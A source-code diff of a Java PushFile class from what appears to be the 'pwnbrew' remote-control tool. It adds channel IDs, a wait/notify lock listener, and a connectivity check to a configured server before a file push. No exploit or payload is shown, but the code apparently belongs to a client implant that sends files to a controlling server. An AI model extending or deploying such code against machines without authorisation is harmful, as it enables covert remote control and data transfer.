@@ -51,9 +51,12 @@ import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.util.Arrays;
 import java.util.logging.Level;
+import pwnbrew.ClientConfig;
+import pwnbrew.concurrent.LockListener;
 import pwnbrew.manager.PortManager;
-import pwnbrew.misc.DebugPrinter;
-import pwnbrew.misc.SocketUtilities;
+import pwnbrew.network.ClientPortRouter;
+import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.SocketUtilities;
 import pwnbrew.network.ControlOption;
 import pwnbrew.network.file.FileMessageManager;
 
@@ -62,7 +65,7 @@ import pwnbrew.network.file.FileMessageManager;
  *
  *  
  */
-public class PushFile extends FileMessage {
+public class PushFile extends FileMessage implements LockListener {
 
     private String hashFilenameStr;
     protected long fileSize = 0;
@@ -77,6 +80,9 @@ public class PushFile extends FileMessage {
     private static final byte OPTION_DATASIZE = 4;
     private static final byte OPTION_FILE_TYPE = 10;
     public static final byte OPTION_REMOTE_DIR = 12;
+    
+    private int lockVal = 0;
+   
   
      //Class name
     private static final String NAME_Class = PushFile.class.getSimpleName();
@@ -86,16 +92,17 @@ public class PushFile extends FileMessage {
      * Constructor
      *
      * @param taskId
+     * @param channelId
      * @param passedType
      * @param fileHashNameStr
      * @param passedLength
     */
-    public PushFile( int taskId, String fileHashNameStr, long passedLength, int passedType ) { // NO_UCD (use default)
-        super( taskId );
+    public PushFile( int taskId, int channelId, String fileHashNameStr, long passedLength, int passedType ) { // NO_UCD (use default)
+        super( channelId, taskId );
         
         byte[] strBytes = fileHashNameStr.getBytes();
         ControlOption aTlv = new ControlOption(OPTION_HASH_FILENAME, strBytes);
-        addOption(aTlv);
+        addOption(aTlv);       
 
         fileSize = passedLength;
         byte[] fileSizeArray = SocketUtilities.longToByteArray(fileSize);
@@ -244,7 +251,7 @@ public class PushFile extends FileMessage {
             String hashFileStr = getHashFilenameString();
             String otherHFStr = passedMessage.getHashFilenameString();
 
-            if(Arrays.equals(msgId, passedMessage.msgId ) &&
+            if(Arrays.equals(channelId, passedMessage.channelId ) &&
                     hashFileStr.equals(otherHFStr) ){
                 return true;
             }       
@@ -257,6 +264,41 @@ public class PushFile extends FileMessage {
     public int hashCode() {
         int hash = 3;
         return hash;
+    }
+    
+     //===============================================================
+    /**
+     * 
+     * @param lockOp 
+     */
+    @Override
+    public synchronized void lockUpdate(int lockOp) {
+        lockVal = lockOp;
+        notifyAll();
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @return  
+     */
+    @Override
+    public synchronized int waitForLock() {
+        
+        int retVal;        
+        while( lockVal == 0 ){
+            try {
+                wait();
+            } catch (InterruptedException ex) {
+                continue;
+            }
+        }
+        
+        //Set to temp and reset
+        retVal = lockVal;
+        lockVal = 0;
+        
+        return retVal;
     }
   
   //===============================================================
@@ -275,8 +317,19 @@ public class PushFile extends FileMessage {
                 theFileMM = FileMessageManager.initialize( passedManager );
             }
                    
+            ClientConfig theConf = ClientConfig.getConfig();
+            int socketPort = theConf.getSocketPort();
+            String serverIp = theConf.getServerIp();
+
+            //Get the port router
+            ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
             DebugPrinter.printMessage(  this.getClass().getSimpleName(), "Received push file.");
-            theFileMM.prepFilePush( this );
+            
+            int retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
+            if(retChannelId != 0 ){
+                setFileChannelId(retChannelId);
+                theFileMM.prepFilePush( this );
+            }
 
         } catch ( LoggableException | IOException ex) {
             RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );
